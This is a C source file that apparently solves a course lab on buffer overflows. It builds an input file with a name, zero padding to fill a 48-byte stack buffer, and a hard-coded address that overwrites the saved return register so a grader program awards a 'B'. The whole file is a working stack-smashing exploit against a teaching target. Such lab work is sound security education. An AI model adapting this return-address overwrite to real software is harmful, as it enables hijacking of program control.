#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/*
produces a file called dataB with the student name, a nullbyte, padding to
overrun the stack, and the address of the instruction in main to get a 'b',
the latter of which will overwrite getName's stored x30. this causes the
grader program to give a 'b' grade, even if the provided name isn't "andrew appel".
*/

/*
this main function:
- takes no command-line arguments.
- does not read from stdin.
- does not write to stdout or stderr (except in error conditions).
- writes a specific sequence of bytes to a file named "dataB" for a B grade.
- returns 0 on success.
*/

int main(void) {
    const char *myName = "Anish";
    size_t nameLen = 5;
    size_t bufSize = 48;
    size_t totalNameBytes = nameLen + 1;
    size_t paddingBytes = bufSize - totalNameBytes;
    uint64_t bAddress = 0x400890;

    FILE *fp = fopen("dataB", "w");
    if (!fp) {
        perror("fopen");
        exit(1);
    }

    /* write the chosen name and a null terminator */
    fwrite(myName, 1, nameLen, fp);
    fputc('\0', fp);

    /* write padding until we fill the 48-byte buffer */
    for (size_t i = 0; i < paddingBytes; i++) {
        fputc('\0', fp);
    }

    /* overwrite the return address with the address that sets grade='b' */
    fwrite(&bAddress, sizeof(bAddress), 1, fp);

    fclose(fp);
    return 0;
}